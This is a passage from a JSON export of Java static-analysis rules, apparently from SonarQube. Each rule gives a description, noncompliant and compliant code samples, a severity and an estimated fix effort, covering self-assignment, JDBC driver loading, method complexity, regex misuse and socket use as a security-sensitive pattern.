}\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule doesn't raise an issue when the class is declared <code>abstract</code>.</p>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1656",
            "repo": "java",
            "name": "Variables should not be self-assigned",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake\nand some other value or variable was intended for the assignment instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void setName(String name) {\n  name = name;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void setName(String name) {\n  this.name = name;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n</ul>",
            "mdDesc": "<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake\nand some other value or variable was intended for the assignment instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void setName(String name) {\n  name = name;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void setName(String name) {\n  this.name = name;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "3min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "3min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "3min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "3min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1659",
            "repo": "java",
            "name": "Multiple variables should not be declared on the same line",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Declaring multiple variables on one line is difficult to read.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass {\n\n  private int a, b;\n\n  public void method(){\n    int c; int d;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass {\n\n  private int a;\n  private int b;\n\n  public void method(){\n    int c;\n    int d;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/YTZGBQ\">CERT, DCL52-J.</a> - Do not declare more than one variable per declaration </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/EtcxBQ\">CERT, DCL04-C.</a> - Do not declare more than one variable per declaration </li>\n</ul>",
            "mdDesc": "<p>Declaring multiple variables on one line is difficult to read.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass {\n\n  private int a, b;\n\n  public void method(){\n    int c; int d;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass {\n\n  private int a;\n  private int b;\n\n  public void method(){\n    int c;\n    int d;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/YTZGBQ\">CERT, DCL52-J.</a> - Do not declare more than one variable per declaration </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/EtcxBQ\">CERT, DCL04-C.</a> - Do not declare more than one variable per declaration </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1301",
            "repo": "java",
            "name": "\"switch\" statements should have at least 3 \"case\" clauses",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>\n<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (variable) {\n  case 0:\n    doSomething();\n    break;\n  default:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (variable == 0) {\n  doSomething();\n} else {\n  doSomethingElse();\n}\n</pre>",
            "mdDesc": "<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>\n<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (variable) {\n  case 0:\n    doSomething();\n    break;\n  default:\n    doSomethingElse();\n    break;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (variable == 0) {\n  doSomething();\n} else {\n  doSomethingElse();\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4925",
            "repo": "java",
            "name": "\"Class.forName()\" should not load JDBC 4.0+ drivers",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>In the past, it was required to load a JDBC driver before creating a <code>java.sql.Connection</code>. Nowadays, when using JDBC 4.0 drivers, this\nis no longer required and <code>Class.forName()</code> can be safely removed because JDBC 4.0 (JDK 6) drivers available in the classpath are\nautomatically loaded.</p>\n<p>This rule raises an issue when <code>Class.forName()</code> is used with one of the following values:</p>\n<ul>\n  <li> <code>com.mysql.jdbc.Driver</code> </li>\n  <li> <code>oracle.jdbc.driver.OracleDriver</code> </li>\n  <li> <code>com.ibm.db2.jdbc.app.DB2Driver</code> </li>\n  <li> <code>com.ibm.db2.jdbc.net.DB2Driver</code> </li>\n  <li> <code>com.sybase.jdbc.SybDriver</code> </li>\n  <li> <code>com.sybase.jdbc2.jdbc.SybDriver</code> </li>\n  <li> <code>com.teradata.jdbc.TeraDriver</code> </li>\n  <li> <code>com.microsoft.sqlserver.jdbc.SQLServerDriver</code> </li>\n  <li> <code>org.postgresql.Driver</code> </li>\n  <li> <code>sun.jdbc.odbc.JdbcOdbcDriver</code> </li>\n  <li> <code>org.hsqldb.jdbc.JDBCDriver</code> </li>\n  <li> <code>org.h2.Driver</code> </li>\n  <li> <code>org.firebirdsql.jdbc.FBDriver</code> </li>\n  <li> <code>net.sourceforge.jtds.jdbc.Driver</code> </li>\n  <li> <code>com.ibm.db2.jcc.DB2Driver</code> </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.SQLException;\n\npublic class Demo {\n  private static final String DRIVER_CLASS_NAME = \"org.postgresql.Driver\";\n  private final Connection connection;\n\n  public Demo(String serverURI) throws SQLException, ClassNotFoundException {\n    Class.forName(DRIVER_CLASS_NAME); // Noncompliant; no longer required to load the JDBC Driver using Class.forName()\n    connection = DriverManager.getConnection(serverURI);\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.SQLException;\n\npublic class Demo {\n    private final Connection connection;\n\n    public Demo(String serverURI) throws SQLException {\n        connection = DriverManager.getConnection(serverURI);\n    }\n}\n</pre>",
            "mdDesc": "<p>In the past, it was required to load a JDBC driver before creating a <code>java.sql.Connection</code>. Nowadays, when using JDBC 4.0 drivers, this\nis no longer required and <code>Class.forName()</code> can be safely removed because JDBC 4.0 (JDK 6) drivers available in the classpath are\nautomatically loaded.</p>\n<p>This rule raises an issue when <code>Class.forName()</code> is used with one of the following values:</p>\n<ul>\n  <li> <code>com.mysql.jdbc.Driver</code> </li>\n  <li> <code>oracle.jdbc.driver.OracleDriver</code> </li>\n  <li> <code>com.ibm.db2.jdbc.app.DB2Driver</code> </li>\n  <li> <code>com.ibm.db2.jdbc.net.DB2Driver</code> </li>\n  <li> <code>com.sybase.jdbc.SybDriver</code> </li>\n  <li> <code>com.sybase.jdbc2.jdbc.SybDriver</code> </li>\n  <li> <code>com.teradata.jdbc.TeraDriver</code> </li>\n  <li> <code>com.microsoft.sqlserver.jdbc.SQLServerDriver</code> </li>\n  <li> <code>org.postgresql.Driver</code> </li>\n  <li> <code>sun.jdbc.odbc.JdbcOdbcDriver</code> </li>\n  <li> <code>org.hsqldb.jdbc.JDBCDriver</code> </li>\n  <li> <code>org.h2.Driver</code> </li>\n  <li> <code>org.firebirdsql.jdbc.FBDriver</code> </li>\n  <li> <code>net.sourceforge.jtds.jdbc.Driver</code> </li>\n  <li> <code>com.ibm.db2.jcc.DB2Driver</code> </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.SQLException;\n\npublic class Demo {\n  private static final String DRIVER_CLASS_NAME = \"org.postgresql.Driver\";\n  private final Connection connection;\n\n  public Demo(String serverURI) throws SQLException, ClassNotFoundException {\n    Class.forName(DRIVER_CLASS_NAME); // Noncompliant; no longer required to load the JDBC Driver using Class.forName()\n    connection = DriverManager.getConnection(serverURI);\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.SQLException;\n\npublic class Demo {\n    private final Connection connection;\n\n    public Demo(String serverURI) throws SQLException {\n        connection = DriverManager.getConnection(serverURI);\n    }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "obsolete"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1541",
            "repo": "java",
            "name": "Methods should not be too complex",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The cyclomatic complexity of methods should not exceed a defined threshold.</p>\n<p>Complex code can perform poorly and will in any case be difficult to understand and therefore to maintain.</p>\n<h2>Exceptions</h2>\n<p>While having a large number of fields in a class may indicate that it should be split, this rule nonetheless ignores high complexity in\n<code>equals</code> and <code>hashCode</code> methods.</p>",
            "mdDesc": "<p>The cyclomatic complexity of methods should not exceed a defined threshold.</p>\n<p>Complex code can perform poorly and will in any case be difficult to understand and therefore to maintain.</p>\n<h2>Exceptions</h2>\n<p>While having a large number of fields in a class may indicate that it should be split, this rule nonetheless ignores high complexity in\n<code>equals</code> and <code>hashCode</code> methods.</p>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "Threshold",
                    "htmlDesc": "The maximum authorized complexity.",
                    "defaultValue": "10",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "LINEAR_OFFSET",
            "defaultDebtRemFnCoeff": "1min",
            "defaultDebtRemFnOffset": "10min",
            "effortToFixDescription": "per complexity point above the threshold",
            "debtOverloaded": false,
            "debtRemFnType": "LINEAR_OFFSET",
            "debtRemFnCoeff": "1min",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "LINEAR_OFFSET",
            "defaultRemFnGapMultiplier": "1min",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "LINEAR_OFFSET",
            "remFnGapMultiplier": "1min",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "gapDescription": "per complexity point above the threshold",
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1309",
            "repo": "java",
            "name": "Track uses of \"@SuppressWarnings\" annotations",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>This rule allows you to track the usage of the <code>@SuppressWarnings</code> mechanism.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With a parameter value of \"unused\" :</p>\n<pre>\n@SuppressWarnings(\"unused\")\n@SuppressWarnings(\"unchecked\")  // Noncompliant\n</pre>",
            "mdDesc": "<p>This rule allows you to track the usage of the <code>@SuppressWarnings</code> mechanism.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With a parameter value of \"unused\" :</p>\n<pre>\n@SuppressWarnings(\"unused\")\n@SuppressWarnings(\"unchecked\")  // Noncompliant\n</pre>",
            "severity": "INFO",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "listOfWarnings",
                    "htmlDesc": "Comma separated list of warnings that can be suppressed (example: unchecked, cast, boxing). An empty list means that no warning can be suppressed.",
                    "type": "STRING"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2638",
            "repo": "java",
            "name": "Method overrides should not change contracts",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Because a subclass instance may be cast to and treated as an instance of the superclass, overriding methods should uphold the aspects of the\nsuperclass contract that relate to the Liskov Substitution Principle. Specifically, if the parameters or return type of the superclass method are\nmarked with any of the following: <code>@Nullable</code>, <code>@CheckForNull</code>, <code>@NotNull</code>, <code>@NonNull</code>, and\n<code>@Nonnull</code>, then subclass parameters are not allowed to tighten the contract, and return values are not allowed to loosen it.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Fruit {\n\n  private Season ripe;\n  private String color;\n\n  public void setRipe(@Nullable Season ripe) {\n    this.ripe = ripe;\n  }\n\n  public @NotNull Integer getProtein() {\n    return 12;\n  }\n}\n\npublic class Raspberry extends Fruit {\n\n  public void setRipe(@NotNull Season ripe) {  // Noncompliant\n    this.ripe = ripe;\n  }\n\n  public @Nullable Integer getProtein() {  // Noncompliant\n    return null;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Liskov_substitution_principle\">Wikipedia - Liskov substitution principle</a> </li>\n</ul>",
            "mdDesc": "<p>Because a subclass instance may be cast to and treated as an instance of the superclass, overriding methods should uphold the aspects of the\nsuperclass contract that relate to the Liskov Substitution Principle. Specifically, if the parameters or return type of the superclass method are\nmarked with any of the following: <code>@Nullable</code>, <code>@CheckForNull</code>, <code>@NotNull</code>, <code>@NonNull</code>, and\n<code>@Nonnull</code>, then subclass parameters are not allowed to tighten the contract, and return values are not allowed to loosen it.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Fruit {\n\n  private Season ripe;\n  private String color;\n\n  public void setRipe(@Nullable Season ripe) {\n    this.ripe = ripe;\n  }\n\n  public @NotNull Integer getProtein() {\n    return 12;\n  }\n}\n\npublic class Raspberry extends Fruit {\n\n  public void setRipe(@NotNull Season ripe) {  // Noncompliant\n    this.ripe = ripe;\n  }\n\n  public @Nullable Integer getProtein() {  // Noncompliant\n    return null;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Liskov_substitution_principle\">Wikipedia - Liskov substitution principle</a> </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2639",
            "repo": "java",
            "name": "Inappropriate regular expressions should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Regular expressions are powerful but tricky, and even those long used to using them can make mistakes.</p>\n<p>The following should not be used as regular expressions:</p>\n<ul>\n  <li> <code>.</code> - matches any single character. Used in <code>replaceAll</code>, it matches <em>everything</em> </li>\n  <li> <code>|</code> - normally used as an option delimiter. Used stand-alone, it matches the space between characters </li>\n  <li> <code>File.separator</code> - matches the platform-specific file path delimiter. On Windows, this will be taken as an escape character </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString str = \"/File|Name.txt\";\n\nString clean = str.replaceAll(\".\",\"\"); // Noncompliant; probably meant to remove only dot chars, but returns an empty string\nString clean2 = str.replaceAll(\"|\",\"_\"); // Noncompliant; yields _/_F_i_l_e_|_N_a_m_e_._t_x_t_\nString clean3 = str.replaceAll(File.separator,\"\"); // Noncompliant; exception on Windows\n\nString clean4 = str.replaceFirst(\".\",\"\"); // Noncompliant;\nString clean5 = str.replaceFirst(\"|\",\"_\"); // Noncompliant;\nString clean6 = str.replaceFirst(File.separator,\"\"); // Noncompliant;\n</pre>",
            "mdDesc": "<p>Regular expressions are powerful but tricky, and even those long used to using them can make mistakes.</p>\n<p>The following should not be used as regular expressions:</p>\n<ul>\n  <li> <code>.</code> - matches any single character. Used in <code>replaceAll</code>, it matches <em>everything</em> </li>\n  <li> <code>|</code> - normally used as an option delimiter. Used stand-alone, it matches the space between characters </li>\n  <li> <code>File.separator</code> - matches the platform-specific file path delimiter. On Windows, this will be taken as an escape character </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString str = \"/File|Name.txt\";\n\nString clean = str.replaceAll(\".\",\"\"); // Noncompliant; probably meant to remove only dot chars, but returns an empty string\nString clean2 = str.replaceAll(\"|\",\"_\"); // Noncompliant; yields _/_F_i_l_e_|_N_a_m_e_._t_x_t_\nString clean3 = str.replaceAll(File.separator,\"\"); // Noncompliant; exception on Windows\n\nString clean4 = str.replaceFirst(\".\",\"\"); // Noncompliant;\nString clean5 = str.replaceFirst(\"|\",\"_\"); // Noncompliant;\nString clean6 = str.replaceFirst(File.separator,\"\"); // Noncompliant;\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2757",
            "repo": "java",
            "name": "\"=+\" should not be used instead of \"+=\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,\n<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>\n<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when\nthere is at least one whitespace character after.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint target = -5;\nint num = 3;\n\ntarget =- num;  // Noncompliant; target = -3. Is that really what's meant?\ntarget =+ num; // Noncompliant; target = 3\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint target = -5;\nint num = 3;\n\ntarget = -num;  // Compliant; intent to assign inverse value of num is clear\ntarget += num;\n</pre>",
            "mdDesc": "<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,\n<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>\n<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when\nthere is at least one whitespace character after.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint target = -5;\nint num = 3;\n\ntarget =- num;  // Noncompliant; target = -3. Is that really what's meant?\ntarget =+ num; // Noncompliant; target = 3\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint target = -5;\nint num = 3;\n\ntarget = -num;  // Compliant; intent to assign inverse value of num is clear\ntarget += num;\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4818",
            "repo": "java",
            "name": "Using Sockets is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785\">CVE-2011-178</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645\">CVE-2017-5645</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597\">CVE-2018-6597</a> </li>\n</ul>\n<p>Sockets are vulnerable in multiple ways:</p>\n<ul>\n  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive\n  sensitive information or inject dangerous input. </li>\n  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>\n</ul>\n<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the\nuse of http connections.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> sockets are created without any limit every time a user performs an action. </li>\n  <li> input received from sockets is used without being sanitized. </li>\n  <li> sensitive data is sent via sockets without being encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>\n  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> any input read from the socket. </li>\n  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n// === java.net ===\nimport java.net.Socket;\nimport java.net.InetAddress;\nimport java.net.Proxy;\nimport java.net.ServerSocket;\nimport javax.net.SocketFactory;\n\nclass A {\n    void foo(SocketFactory factory, String address, int port, InetAddress localAddr, int localPort, boolean stream,\n            String host, Proxy proxy, int backlog, InetAddress bindAddr)\n            throws Exception {\n        new Socket(); // Sensitive.\n        new Socket(address, port); // Sensitive.\n        new Socket(address, port, localAddr, localPort); // Sensitive.\n        new Socket(host, port, stream); // Sensitive.\n        new Socket(proxy); // Sensitive.\n        new Socket(host, port); // Sensitive.\n        new Socket(host, port, stream); // Sensitive.\n        new Socket(host, port, localAddr, localPort); // Sensitive.\n\n        new ServerSocket(); // Sensitive.\n        new ServerSocket(port); // Sensitive.\n        new ServerSocket(port, backlog); // Sensitive.\n        new ServerSocket(port, backlog, bindAddr); // Sensitive.\n\n        factory.createSocket(); // Sensitive\n    }\n}\n\nabstract class mySocketFactory extends SocketFactory { // Sensitive. Review how the sockets are created.\n    // ...\n}\n</pre>\n<pre>\n// === java.nio.channels ===\nimport java.net.SocketAddress;\nimport java.nio.channels.AsynchronousChannelGroup;\nimport java.nio.channels.AsynchronousServerSocketChannel;\nimport java.nio.channels.AsynchronousSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.channels.ServerSocketChannel;\n\nclass A {\n    void foo(AsynchronousChannelGroup group, SocketAddress remote) throws Exception {\n        AsynchronousServerSocketChannel.open(); // Sensitive.\n        AsynchronousServerSocketChannel.open(group); // Sensitive.\n        AsynchronousSocketChannel.open(); // Sensitive.\n        AsynchronousSocketChannel.open(group); // Sensitive.\n        SocketChannel.open(); // Sensitive.\n        SocketChannel.open(remote); // Sensitive.\n        ServerSocketChannel.open(); // Sensitive.\n    }\n}\n</pre>\n<pre>\n// === Netty ===\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.socket.ServerSocketChannel;\nimport io.netty.channel.socket.SocketChannel;\n\nclass CustomChannelInitializer extends ChannelInitializer&lt;ServerSocketChannel&gt; { // Sensitive. Review how the SocketChannel is used.\n    @Override\n    protected void initChannel(ServerSocketChannel ch) throws Exception {\n    }\n}\n\nclass A {\n    void foo() {\n        new ChannelInitializer&lt;SocketChannel&gt;() {  // Sensitive\n            @Override\n            public void initChannel(SocketChannel ch) throws Exception {\n                // ...\n            }\n        };\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/20\">MITRE, CWE-20</a> - Improper Input Validation </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/400\">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/200\">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat2\">SANS Top 25</a> - Risky Resource Management </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "mdDesc": "<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785\">CVE-2011-178</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645\">CVE-2017-5645</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597\">CVE-2018-6597</a> </li>\n</ul>\n<p>Sockets are vulnerable in multiple ways:</p>\n<ul>\n  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive\n  sensitive information or inject dangerous input. </li>\n  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>\n</ul>\n<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the\nuse of http connections.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> sockets are created without any limit every time a user performs an action. </li>\n  <li> input received from sockets is used without being sanitized. </li>\n  <li> sensitive data is sent via sockets without being encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those 